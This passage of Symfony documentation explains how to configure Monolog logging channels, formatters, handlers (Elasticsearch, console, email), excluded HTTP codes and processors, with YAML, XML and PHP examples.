        use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog, ContainerConfigurator $container) {
            if ('prod' === $container->env()) {
                $monolog->handler('security')
                    ->type('stream')
                    ->path(param('kernel.logs_dir') . \DIRECTORY_SEPARATOR . 'security.log')
                    ->channels()->elements(['security']);

                $monolog->handler('main')
                     // ...

                    ->channels()->elements(['!security']);
            }
        };

.. caution::

    The ``channels`` configuration only works for top-level handlers. Handlers
    that are nested inside a group, buffer, filter, fingers crossed or other
    such handler will ignore this configuration and will process every message
    passed to them.

.. _yaml-specification:

You can specify the configuration in different ways:

.. code-block:: yaml

    channels: ~    # Include all the channels

    channels: foo  # Include only channel 'foo'
    channels: '!foo' # Include all channels, except 'foo'

    channels: [foo, bar]   # Include only channels 'foo' and 'bar'
    channels: ['!foo', '!bar'] # Include all channels, except 'foo' and 'bar'

Creating your own Channel
-------------------------

You can change the channel Monolog logs to one service at a time. This is done
either via the :ref:`configuration <monolog-channels-config>` below
or by tagging your service with :ref:`monolog.logger <dic_tags-monolog>` and
specifying which channel the service should log to. With the tag, the logger
that is injected into that service is preconfigured to use the channel you've
specified.

.. _monolog-channels-config:

Configure Additional Channels without Tagged Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can also configure additional channels without the need to tag your services:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/monolog.yaml
        monolog:
            channels: ['foo', 'bar', 'foo_bar']

    .. code-block:: xml

        <!-- config/packages/monolog.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:channel>foo</monolog:channel>
                <monolog:channel>bar</monolog:channel>
                <monolog:channel>foo_bar</monolog:channel>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->channels(['foo', 'bar', 'foo_bar']);
        };

Symfony automatically registers one service per channel (in this example, the
channel ``foo`` creates a service called ``monolog.logger.foo``). In order to
inject this service into others, you must update the service configuration to
:ref:`choose the specific service to inject <services-wire-specific-service>`.

.. _monolog-autowire-channels:

How to Autowire Logger Channels
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Starting from `MonologBundle`_ 3.5 you can autowire different Monolog channels
by type-hinting your service arguments with the following syntax:
``Psr\Log\LoggerInterface $<camelCased channel name> + Logger``. The ``<channel>``
must have been :ref:`predefined in your Monolog configuration <monolog-channels-config>`.

For example to inject the service related to the ``foo_bar`` logger channel,
change your constructor like this:

.. code-block:: diff

        public function __construct(
    -     LoggerInterface $logger,
    +     LoggerInterface $fooBarLogger,
        ) {
        }

Configure Logger Channels with Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Starting from `Monolog`_ 3.5 you can also configure the logger channel
by using the ``#[WithMonologChannel]`` attribute directly on your service
class::

    // src/Service/MyFixtureService.php
    namespace App\Service;

    use Monolog\Attribute\WithMonologChannel;
    use Psr\Log\LoggerInterface;
    use Symfony\Bridge\Monolog\Logger;

    #[WithMonologChannel('fixtures')]
    class MyFixtureService
    {
        public function __construct(LoggerInterface $logger)
        {
            // ...
        }
    }

This way you can avoid declaring your service manually to use a specific
channel.

.. versionadded:: 3.5

    The ``#[WithMonologChannel]`` attribute was introduced in Monolog 3.5.0.

.. _`MonologBundle`: https://github.com/symfony/monolog-bundle
.. _`Monolog`: https://github.com/Seldaek/monolog
How to Define a Custom Logging Formatter
========================================

Each logging handler uses a ``Formatter`` to format the record before logging
it. All Monolog handlers use an instance of
``Monolog\Formatter\LineFormatter`` by default but you can replace it.
Your formatter must implement ``Monolog\Formatter\FormatterInterface``.

For example, to use the built-in ``JsonFormatter``, register it as a service then
configure your handler to use it:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml (and/or config/packages/dev/monolog.yaml)
        monolog:
            handlers:
                file:
                    type: stream
                    level: debug
                    formatter: 'monolog.formatter.json'

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml (and/or config/packages/dev/monolog.xml) -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler
                    name="file"
                    type="stream"
                    level="debug"
                    formatter="monolog.formatter.json"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php (and/or config/packages/dev/monolog.php)
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('file')
                ->type('stream')
                ->level('debug')
                ->formatter('monolog.formatter.json')
            ;
        };

Many built-in formatters are available in Monolog. A lot of them are declared as services
and can be used in the ``formatter`` option:

* ``monolog.formatter.chrome_php``: formats a record according to the ChromePHP array format
* ``monolog.formatter.gelf_message``: serializes a format to GELF format
* ``monolog.formatter.html``: formats a record into an HTML table
* ``monolog.formatter.json``: serializes a record into a JSON object
* ``monolog.formatter.line``: formats a record into a one-line string
* ``monolog.formatter.loggly``: formats a record information into JSON in a format compatible with Loggly
* ``monolog.formatter.logstash``: serializes a record to Logstash Event Format
* ``monolog.formatter.normalizer``: normalizes a record to remove objects/resources so it's easier to dump to various targets
* ``monolog.formatter.scalar``: formats a record into an associative array of scalar (+ null) values (objects and arrays will be JSON encoded)
* ``monolog.formatter.wildfire``: serializes a record according to Wildfire's header requirements
Handlers
========

ElasticsearchLogstashHandler
----------------------------

This handler deals directly with the HTTP interface of Elasticsearch. This means
it will slow down your application if Elasticsearch takes time to answer. Even
if all HTTP calls are done asynchronously.

To use it, declare it as a service:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler: ~

            # optionally, configure the handler using the constructor arguments (shown values are default)
            Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler:
                arguments:
                    $endpoint: "http://127.0.0.1:9200"
                    $index: "monolog"
                    $client: null
                    $level: !php/enum Monolog\Level::Debug
                    $bubble: true
                    $elasticsearchVersion: '1.0.0'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <services>
                <service id="Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler"/>

                <!-- optionally, configure the handler using the constructor arguments (shown values are default) -->
                <service id="Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler">
                    <argument key="endpoint">http://127.0.0.1:9200</argument>
                    <argument key="index">monolog</argument>
                    <argument key="client"/>
                    <argument key="level" type="enum">Monolog\Level::Debug</argument>
                    <argument key="bubble">true</argument>
                    <argument key="elasticsearchVersion">1.0.0</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Monolog\Level;
        use Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler;

        $container->register(ElasticsearchLogstashHandler::class);

        // optionally, configure the handler using the constructor arguments (shown values are default)
        $container->register(ElasticsearchLogstashHandler::class)
            ->setArguments([
                '$endpoint' => "http://127.0.0.1:9200",
                '$index' => "monolog",
                '$client' => null,
                '$level' => Level::Debug,
                '$bubble' => true,
                '$elasticsearchVersion' => '1.0.0',
            ])
        ;

Then reference it in the Monolog configuration.

In a development environment, it's fine to keep the default configuration: for
each log, an HTTP request will be made to push the log to Elasticsearch:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                es:
                    type: service
                    id: Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler
                    name="es"
                    type="service"
                    id="Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('es')
                ->type('service')
                ->id(ElasticsearchLogstashHandler::class)
            ;
        };

In a production environment, it's highly recommended to wrap this handler in a
handler with buffering capabilities (like the `FingersCrossedHandler`_ or
`BufferHandler`_) in order to call Elasticsearch only once with a bulk push. For
even better performance and fault tolerance, a proper `ELK stack`_ is recommended.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    type: fingers_crossed
                    handler: es

                es:
                    type: service
                    id: Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler
                    name="main"
                    type="fingers_crossed"
                    handler="es"
                />
                <monolog:handler
                    name="es"
                    type="service"
                    id="Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Bridge\Monolog\Handler\ElasticsearchLogstashHandler;
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('main')
                ->type('fingers_crossed')
                ->handler('es')
            ;
            $monolog->handler('es')
                ->type('service')
                ->id(ElasticsearchLogstashHandler::class)
            ;
        };

.. _`BufferHandler`: https://github.com/Seldaek/monolog/blob/main/src/Monolog/Handler/BufferHandler.php
.. _`ELK stack`: https://www.elastic.co/what-is/elk-stack
.. _`FingersCrossedHandler`: https://github.com/Seldaek/monolog/blob/main/src/Monolog/Handler/FingersCrossedHandler.php
How to Configure Monolog to Display Console Messages
====================================================

It is possible to use the console to print messages for certain
:doc:`verbosity levels </console/verbosity>` using the
:class:`Symfony\\Component\\Console\\Output\\OutputInterface` instance that
is passed when a command is run.

When a lot of logging has to happen, it's cumbersome to print information
depending on the verbosity settings (``-v``, ``-vv``, ``-vvv``) because the
calls need to be wrapped in conditions. For example::

    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        if ($output->isDebug()) {
            $output->writeln('Some info');
        }

        if ($output->isVerbose()) {
            $output->writeln('Some more info');
        }

        // ...
    }

Instead of using these semantic methods to test for each of the verbosity
levels, the `MonologBridge`_ provides a
:class:`Symfony\\Bridge\\Monolog\\Handler\\ConsoleHandler` that listens to
console events and writes log messages to the console output depending on
the current log level and the console verbosity.

The example above could then be rewritten as::

    // src/Command/YourCommand.php
    namespace App\Command;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class YourCommand extends Command
    {
        public function __construct(
            private LoggerInterface $logger,
        ) {
            parent::__construct();
        }

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $this->logger->debug('Some info');
            $this->logger->notice('Some more info');

            return Command::SUCCESS;
        }
    }

Depending on the verbosity level that the command is run in and the user's
configuration (see below), these messages may or may not be displayed to
the console. If they are displayed, they are time-stamped and colored appropriately.
Additionally, error logs are written to the error output (``php://stderr``).
There is no need to conditionally handle the verbosity settings anymore.

===============  =======================================  ============
LoggerInterface  Verbosity                                Command line
===============  =======================================  ============
->error()        OutputInterface::VERBOSITY_QUIET         stderr
->warning()      OutputInterface::VERBOSITY_NORMAL        stdout
->notice()       OutputInterface::VERBOSITY_VERBOSE       -v
->info()         OutputInterface::VERBOSITY_VERY_VERBOSE  -vv
->debug()        OutputInterface::VERBOSITY_DEBUG         -vvv
===============  =======================================  ============

The Monolog console handler is enabled by default:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/dev/monolog.yaml
        monolog:
            handlers:
                # ...
                console:
                    type:   console
                    process_psr_3_messages: false
                    channels: ['!event', '!doctrine', '!console']

                    # optionally configure the mapping between verbosity levels and log levels
                    # verbosity_levels:
                    #     VERBOSITY_NORMAL: NOTICE

    .. code-block:: xml

        <!-- config/packages/dev/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <monolog:config>
                <!-- ... -->

                <monolog:handler name="console" type="console" process-psr-3-messages="false">
                    <monolog:channels>
                        <monolog:channel>!event</monolog:channel>
                        <monolog:channel>!doctrine</monolog:channel>
                        <monolog:channel>!console</monolog:channel>
                    </monolog:channels>
                </monolog:handler>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/dev/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('console')
                ->type('console')
                ->processPsr3Messages(false)
                ->channels()->elements(['!event', '!doctrine', '!console'])
            ;
        };

Now, log messages will be shown on the console based on the log levels and verbosity.
By default (normal verbosity level), warnings and higher will be shown. But in
:doc:`full verbosity mode </console/verbosity>`, all messages will be shown.

.. _MonologBridge: https://github.com/symfony/monolog-bridge
How to Configure Monolog to Email Errors
========================================

.. versionadded:: 3.6

    Support for emailing errors using :doc:`Symfony mailer </mailer>` was added
    in MonologBundle 3.6.

`Monolog`_ can be configured to send an email when an error occurs within an
application. The configuration for this requires a few nested handlers
in order to avoid receiving too many emails. This configuration looks
complicated at first but each handler is fairly straightforward when
it is broken down.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    type:         fingers_crossed
                    # 500 errors are logged at the critical level
                    action_level: critical
                    # to also log 400 level errors (but not 404's):
                    # action_level: error
                    # excluded_http_codes: [404]
                    handler:      deduplicated
                deduplicated:
                    type:    deduplication
                    handler: symfony_mailer
                symfony_mailer:
                    type:       symfony_mailer
                    from_email: 'error@example.com'
                    to_email:   'error@example.com'
                    # or list of recipients
                    # to_email:   ['dev1@example.com', 'dev2@example.com', ...]
                    subject:    'An Error Occurred! %%message%%'
                    level:      debug
                    formatter:  monolog.formatter.html
                    content_type: text/html

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <!--
                500 errors are logged at the critical level,
                to also log 400 level errors (but not 404's):
                action-level="error"
                And add this child inside this monolog:handler
                <monolog:excluded-http-code code="404"/>
                -->
                <monolog:handler
                    name="main"
                    type="fingers_crossed"
                    action-level="critical"
                    handler="deduplicated"
                />
                <monolog:handler
                    name="deduplicated"
                    type="deduplication"
                    handler="symfony_mailer"
                />
                <monolog:handler
                    name="symfony_mailer"
                    type="symfony_mailer"
                    from-email="error@example.com"
                    subject="An Error Occurred! %%message%%"
                    level="debug"
                    formatter="monolog.formatter.html"
                    content-type="text/html">

                    <monolog:to-email>error@example.com</monolog:to-email>

                    <!-- or list of recipients -->
                    <!--
                    <monolog:to-email>dev1@example.com</monolog:to-email>
                    <monolog:to-email>dev2@example.com</monolog:to-email>
                    ...
                    -->
                </monolog:handler>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $mainHandler = $monolog->handler('main')
                ->type('fingers_crossed')
                // 500 errors are logged at the critical level
                ->actionLevel('critical')
                // to also log 400 level errors:
                // ->actionLevel('error')
                ->handler('deduplicated')
            ;

            // add this to exclude 404 errors
            // $mainHandler->excludedHttpCode()->code(404);

            $monolog->handler('deduplicated')
                ->type('deduplication')
                ->handler('symfony_mailer');

            $monolog->handler('symfony_mailer')
                ->type('symfony_mailer')
                ->fromEmail('error@example.com')
                ->toEmail(['error@example.com'])
                // or a list of recipients
                // ->toEmail(['dev1@example.com', 'dev2@example.com', ...])
                ->subject('An Error Occurred! %%message%%')
                ->level('debug')
                ->formatter('monolog.formatter.html')
                ->contentType('text/html')
            ;
        };

The ``main`` handler is a ``fingers_crossed`` handler which means that
it is only triggered when the action level, in this case ``critical`` is reached.
The ``critical`` level is only triggered for 5xx HTTP code errors. If this level
is reached once, the ``fingers_crossed`` handler will log all messages
regardless of their level. The ``handler`` setting means that the output
is then passed onto the ``deduplicated`` handler.

.. tip::

    If you want both 400 level and 500 level errors to trigger an email,
    set the ``action_level`` to ``error`` instead of ``critical``. See the
    code above for an example.

The ``deduplicated`` handler keeps all the messages for a request and then
passes them onto the nested handler in one go, but only if the records are
unique over a given period of time (60 seconds by default). Duplicated records are
discarded. Adding this handler reduces the amount of
notifications to a manageable level, specially in critical failure scenarios.
You can adjust the time period using the ``time`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                # ...
                deduplicated:
                    type: deduplication
                    # the time in seconds during which duplicate entries are discarded (default: 60)
                    time: 10
                    handler: symfony_mailer

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->

        <!-- time: the time in seconds during which duplicate entries are discarded (default: 60) -->
        <monolog:handler name="deduplicated"
            type="deduplication"
            time="10"
            handler="symfony_mailer"/>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            // ...

            $monolog->handler('deduplicated')
                ->type('deduplicated')
                // the time in seconds during which duplicate entries are discarded (default: 60)
                ->time(10)
                ->handler('symfony_mailer')
            ;
        };

The messages are then passed to the ``symfony_mailer`` handler. This is the handler that
actually deals with emailing you the error. The settings for this are
straightforward, the to and from addresses, the formatter, the content type
and the subject.

You can combine these handlers with other handlers so that the errors still
get logged on the server as well as the emails being sent:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    type:         fingers_crossed
                    action_level: critical
                    handler:      grouped
                grouped:
                    type:    group
                    members: [streamed, deduplicated]
                streamed:
                    type:  stream
                    path:  '%kernel.logs_dir%/%kernel.environment%.log'
                    level: debug
                deduplicated:
                    type:    deduplication
                    handler: symfony_mailer
                symfony_mailer:
                    type:         symfony_mailer
                    from_email:   'error@example.com'
                    to_email:     'error@example.com'
                    subject:      'An Error Occurred! %%message%%'
                    level:        debug
                    formatter:    monolog.formatter.html
                    content_type: text/html

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler
                    name="main"
                    type="fingers_crossed"
                    action_level="critical"
                    handler="grouped"
                />
                <monolog:handler
                    name="grouped"
                    type="group"
                >
                    <member type="stream"/>
                    <member type="deduplicated"/>
                </monolog:handler>
                <monolog:handler
                    name="stream"
                    path="%kernel.logs_dir%/%kernel.environment%.log"
                    level="debug"
                />
                <monolog:handler
                    name="deduplicated"
                    type="deduplication"
                    handler="symfony_mailer"
                />
                <monolog:handler
                    name="symfony_mailer"
                    type="symfony_mailer"
                    from-email="error@example.com"
                    subject="An Error Occurred! %%message%%"
                    level="debug"
                    formatter="monolog.formatter.html"
                    content-type="text/html">

                    <monolog:to-email>error@example.com</monolog:to-email>

                    <!-- or list of recipients -->
                    <!--
                    <monolog:to-email>dev1@example.com</monolog:to-email>
                    <monolog:to-email>dev2@example.com</monolog:to-email>
                    ...
                    -->
                </monolog:handler>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('main')
                ->type('fingers_crossed')
                ->actionLevel('critical')
                ->handler('grouped')
            ;

            $monolog->handler('group')
                ->type('group')
                ->members(['streamed', 'deduplicated'])
            ;

            $monolog->handler('streamed')
                ->type('stream')
                ->path('%kernel.logs_dir%/%kernel.environment%.log')
                ->level('debug')
            ;

            $monolog->handler('deduplicated')
                ->type('deduplicated')
                ->handler('symfony_mailer')
            ;

            // still passed *all* logs, and still only logs error or higher
            $monolog->handler('symfony_mailer')
                ->type('symfony_mailer')
                ->fromEmail('error@example.com')
                ->toEmail(['error@example.com'])
                // or a list of recipients
                // ->toEmail(['dev1@example.com', 'dev2@example.com', ...])
                ->subject('An Error Occurred! %%message%%')
                ->level('debug')
                ->formatter('monolog.formatter.html')
                ->contentType('text/html')
            ;
        };

This uses the ``group`` handler to send the messages to the two
group members, the ``deduplicated`` and the ``stream`` handlers. The messages will
now be both written to the log file and emailed.

.. _Monolog: https://github.com/Seldaek/monolog
How to Configure Monolog to Exclude Specific HTTP Codes from the Log
====================================================================

Sometimes your logs become flooded with unwanted HTTP errors, for example,
403s and 404s. When using a ``fingers_crossed`` handler, you can exclude
logging these HTTP codes based on the MonologBundle configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    # ...
                    type: fingers_crossed
                    handler: ...
                    excluded_http_codes: [403, 404, { 400: ['^/foo', '^/bar'] }]

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler type="fingers_crossed" name="main" handler="...">
                    <!-- ... -->
                    <monolog:excluded-http-code code="403">
                        <monolog:url>^/foo</monolog:url>
                        <monolog:url>^/bar</monolog:url>
                    </monolog:excluded-http-code>
                    <monolog:excluded-http-code code="404"/>
                </monolog:handler>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $mainHandler = $monolog->handler('main')
                // ...
                ->type('fingers_crossed')
                ->handler('...')
            ;

            $mainHandler->excludedHttpCode()->code(403);
            $mainHandler->excludedHttpCode()->code(404);
        };

.. caution::

    Combining ``excluded_http_codes`` with a ``passthru_level`` lower than
    ``error`` (i.e. ``debug``, ``info``, ``notice`` or ``warning``) will not
    actually exclude log messages for those HTTP codes because they are logged
    with level of ``error`` or higher and ``passthru_level`` takes precedence
    over the HTTP codes being listed in ``excluded_http_codes``.
How to Add extra Data to Log Messages via a Processor
=====================================================

`Monolog`_ allows you to process every record before logging it by adding some
extra data. This is the role of a processor, which can be applied for the whole
handler stack or only for a specific handler or channel.

A processor is a callable receiving the record as its first argument.
Processors are configured using the ``monolog.processor`` DIC tag. See the
:ref:`reference about it <dic_tags-monolog-processor>`.

Adding a Session/Request Token
------------------------------

Sometimes it is hard to tell which entries in the log belong to which session
and/or request. The following example will add a unique token for each request
using a processor::

    // src/Logger/SessionRequestProcessor.php
    namespace App\Logger;

    use Monolog\LogRecord;
    use Monolog\Processor\ProcessorInterface;
    use Symfony\Component\HttpFoundation\Exception\SessionNotFoundException;
    use Symfony\Component\HttpFoundation\RequestStack;

    class SessionRequestProcessor implements ProcessorInterface
    {
        public function __construct(
            private RequestStack $requestStack
        ) {
        }

        // method is called for each log record; optimize it to not hurt performance
        public function __invoke(LogRecord $record): LogRecord
        {
            try {
                $session = $this->requestStack->getSession();
            } catch (SessionNotFoundException $e) {
                return $record;
            }
            if (!$session->isStarted()) {
                return $record;
            }

            $sessionId = substr($session->getId(), 0, 8) ?: '????????';

            $record->extra['token'] = $sessionId.'-'.substr(uniqid('', true), -8);

            return $record;
        }
    }

Next, register your class as a service, as well as a formatter that uses the extra
information:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            monolog.formatter.session_request:
                class: Monolog\Formatter\LineFormatter
                arguments:
                    - "[%%datetime%%] [%%extra.token%%] %%channel%%.%%level_name%%: %%message%% %%context%% %%extra%%\n"

            App\Logger\SessionRequestProcessor:
                tags:
                    - { name: monolog.processor }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <services>
                <service id="monolog.formatter.session_request"
                    class="Monolog\Formatter\LineFormatter">

                    <argument>[%%datetime%%] [%%extra.token%%] %%channel%%.%%level_name%%: %%message%% %%context%% %%extra%%&#xA;</argument>
                </service>

                <service id="App\Logger\SessionRequestProcessor">
                    <tag name="monolog.processor"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Logger\SessionRequestProcessor;
        use Monolog\Formatter\LineFormatter;

        $container
            ->register('monolog.formatter.session_request', LineFormatter::class)
            ->addArgument('[%%datetime%%] [%%extra.token%%] %%channel%%.%%level_name%%: %%message%% %%context%% %%extra%%\n');

        $container
            ->register(SessionRequestProcessor::class)
            ->addTag('monolog.processor');

Finally, set the formatter to be used on whatever handler you want:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/prod/monolog.yaml
        monolog:
            handlers:
                main:
                    type: stream
                    path: '%kernel.logs_dir%/%kernel.environment%.log'
                    level: debug
                    formatter: monolog.formatter.session_request

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <monolog:config>
                <monolog:handler
                    name="main"
                    type="stream"
                    path="%kernel.logs_dir%/%kernel.environment%.log"
                    level="debug"
                    formatter="monolog.formatter.session_request"
                />
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
        use Symfony\Config\MonologConfig;

        return static function (MonologConfig $monolog): void {
            $monolog->handler('main')
                ->type('stream')
                ->path('%kernel.logs_dir%/%kernel.environment%.log')
                ->level('debug')
                ->formatter('monolog.formatter.session_request')
            ;
        };

If you use several handlers, you can also register a processor at the
handler level or at the channel level instead of registering it globally
(see the following sections).

When registering a new processor, instead of adding the tag manually in your
configuration files, you can use the ``#[AsMonologProcessor]`` attribute to
apply it on the processor class::

    // src/Logger/SessionRequestProcessor.php
    namespace App\Logger;

    use Monolog\Attribute\AsMonologProcessor;

    #[AsMonologProcessor]
    class SessionRequestProcessor
    {
        // ...
    }

The ``#[AsMonologProcessor]`` attribute takes these optional arguments:

* ``channel``: the logging channel the processor should be pushed to;
* ``handler``: the handler the processor should be pushed to;
* ``method``: the method that processes the records (useful when applying
  the attribute to the entire class instead of a single method).

.. versionadded:: 3.8

    The ``#[AsMonologProcessor]`` attribute was introduced in MonologBundle 3.8.

Symfony's MonologBridge provides processors that can be registered inside your application.

